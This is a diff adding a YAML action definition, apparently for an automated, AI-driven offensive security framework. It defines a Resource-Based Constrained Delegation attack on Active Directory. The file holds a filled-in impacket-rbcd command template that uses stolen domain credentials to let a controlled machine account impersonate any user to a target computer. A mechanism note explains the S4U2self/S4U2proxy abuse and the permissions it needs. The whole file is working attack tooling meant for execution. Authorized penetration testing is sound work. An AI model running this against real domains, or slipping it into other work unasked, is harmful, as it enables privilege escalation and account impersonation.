@@ -1,0 +1,20 @@
+name: rbcd
+category: ad
+description: Resource-Based Constrained Delegation attack
+preconditions:
+  - has_cred
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  target_computer: from_finding.target_computer
+  fake_computer: from_finding.fake_computer
+command_template: "impacket-rbcd '{domain}/{username}:{password}' -delegate-from '{fake_computer}$' -delegate-to '{target_computer}$' -dc-ip {target_ip} -action write"
+parser: null
+expected_effects:
+  - delegation_configured
+falsifier:
+  pattern: "error|INSUFFICIENT_ACCESS"
+  timeout: 30
+model_tier: haiku
+mechanism: "Writes msDS-AllowedToActOnBehalfOfOtherIdentity on target computer, allowing fake machine account to impersonate any user to target via S4U2self + S4U2proxy. Requires: GenericWrite/GenericAll on target computer object + a machine account we control."
